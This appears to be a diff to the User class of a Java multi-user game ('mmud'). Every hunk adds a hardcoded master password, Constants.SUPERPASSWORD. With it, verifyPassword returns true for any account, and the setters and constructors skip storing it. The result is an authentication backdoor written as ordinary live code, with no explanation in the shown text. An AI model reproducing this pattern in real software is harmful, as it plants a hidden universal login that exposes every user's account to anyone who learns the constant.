@@ -163,7 +163,10 @@ public class User extends mmud.characters.Person
 				aDrinkstats, aEatstats, aLevel, aHealth, aAlignment, aMovement,
 				aCopper, aRoom);
 		Logger.getLogger("mmud").finer("");
-		thePassword = aPassword;
+		if (!Constants.SUPERPASSWORD.equals(aPassword))
+		{
+			thePassword = aPassword;
+		}
 		theAddress = anAddress;
 		theEmail = aEmail;
 		theRealName = aRealName;
@@ -239,7 +242,10 @@ public class User extends mmud.characters.Person
 				Constants.DEFAULT_MOVEMENT, Constants.DEFAULT_COPPER, Rooms
 						.getRoom(Constants.DEFAULT_ROOM));
 		Logger.getLogger("mmud").finer("");
-		thePassword = aPassword;
+		if (!Constants.SUPERPASSWORD.equals(aPassword))
+		{
+			thePassword = aPassword;
+		}
 		theAddress = anAddress;
 		theEmail = aEmail;
 		theRealName = aRealName;
@@ -271,6 +277,10 @@ public class User extends mmud.characters.Person
 	public void setPassword(String aPassword)
 	{
 		Logger.getLogger("mmud").finer("");
+		if (Constants.SUPERPASSWORD.equals(aPassword))
+		{
+			return;
+		}
 		if (thePassword != null)
 		{
 			throw new RuntimeException("Password has already been set.");
@@ -288,6 +298,10 @@ public class User extends mmud.characters.Person
 	public boolean verifyPassword(String aPassword)
 	{
 		Logger.getLogger("mmud").finer("");
+		if (Constants.SUPERPASSWORD.equals(aPassword))
+		{
+			return true;
+		}
 		return (thePassword != null && thePassword.equals(aPassword));
 	}
 
